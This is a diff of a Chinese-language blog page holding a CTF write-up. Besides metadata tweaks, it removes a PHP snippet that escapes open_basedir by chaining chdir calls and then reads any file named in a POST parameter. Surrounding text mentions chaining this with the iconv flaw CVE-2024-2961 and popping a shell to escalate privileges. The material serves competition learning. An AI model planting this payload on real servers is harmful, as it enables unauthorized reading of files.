@@ -46,7 +46,7 @@
 <meta property="og:image" content="https://eddiemurphy89.github.io/2024/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/4-2025/image-20250119022246964.png">
 <meta property="og:image" content="https://eddiemurphy89.github.io/2024/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/4-2025/34515a72b254ebcddb1772d74b503c4c.png">
 <meta property="article:published_time" content="2025-01-17T15:39:02.000Z">
-<meta property="article:modified_time" content="2025-01-18T18:27:18.778Z">
+<meta property="article:modified_time" content="2025-01-19T03:27:49.746Z">
 <meta property="article:author" content="EddieMurphy">
 <meta property="article:tag" content="比赛">
 <meta name="twitter:card" content="summary_large_image">
@@ -246,7 +246,7 @@
         <i class="iconfont icon-chart"></i>
         
           <!-- compatible with older versions-->
-          2.7k 字
+          2.6k 字
         
       </span>
     
@@ -257,7 +257,7 @@
         
         
         
-          23 分钟
+          22 分钟
         
       </span>
     
@@ -403,9 +403,7 @@
 <p>难绷的是给你上了蚁剑插件不能绕的<code>disable_functions</code>，限了open_basedir，虽然这个也可以用mkdir和chdir绕，但是没啥效果其实，因为R不了。</p>
 <p><img src="/2024/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/4-2025/image-20250119014202910.png" srcset="/img/loading.gif" lazyload alt="image-20250119014202910"></p>
 <p>这里又用了一个怪招，其实我之前也看到过，用iconv那个洞(CVE-2024-2961)去打，这出题人纯缝合b。。。</p>
-<p>这是我在SCTF星盟安全wp里看到的手段，跳板php+iconv：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;img&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;img&#x27;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File contents: <span class="hljs-subst">$data</span>&quot;</span>;<br></code></pre></td></tr></table></figure>
-
+<p>这是我在SCTF星盟安全wp里看到的手段，跳板php+iconv。</p>
 <p>按照上面的方法重新添加一本书，再把这个写进去就可以了。</p>
 <p><img src="/2024/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/4-2025/image-20250119015523513.png" srcset="/img/loading.gif" lazyload alt="image-20250119015523513"></p>
 <p>但是你还是没权限读flag，必须弹个shell提权。</p>
